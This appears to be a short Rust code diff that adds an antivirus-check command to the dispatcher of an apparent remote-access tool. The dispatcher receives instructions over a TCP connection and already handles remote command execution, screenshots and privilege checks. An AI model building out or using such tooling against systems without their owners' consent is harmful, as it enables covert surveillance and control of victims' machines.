@@ -17,6 +17,7 @@ pub fn dispatch(instruct: InstructMessage, conn: &mut TcpStream) -> Result<bool,
         InstructMessage::Check => system::check_privileges(conn), // check
         InstructMessage::Display(content) => system::display_message(content), // display
         InstructMessage::Screenshot => system::screenshot(conn), // check
+        InstructMessage::AntiVirus => system::av(conn), // check
 
         InstructMessage::Exec(cmd) => exec::run(conn, cmd),
         // InstructMessage::Shell => exec::run(conn),
